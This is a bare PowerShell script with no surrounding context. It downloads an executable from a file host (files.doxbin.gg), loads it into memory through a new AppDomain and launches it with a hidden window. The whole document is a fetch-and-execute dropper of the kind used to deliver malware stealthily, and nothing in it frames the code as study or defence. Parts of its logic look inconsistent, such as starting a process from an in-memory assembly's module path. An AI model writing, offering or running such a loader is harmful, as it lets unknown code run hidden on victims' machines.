$url = "https://files.doxbin.gg/28ODr8dm.exe"

$executableBytes = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content

if ($executableBytes) {
    $appDomain = [System.AppDomain]::CreateDomain("InMemoryDomain")
    $assembly = $appDomain.Load($executableBytes)
    Start-Process -FilePath $assembly.EntryPoint.Module.FullyQualifiedName -WindowStyle Hidden
    [System.AppDomain]::Unload($appDomain)
} else {
}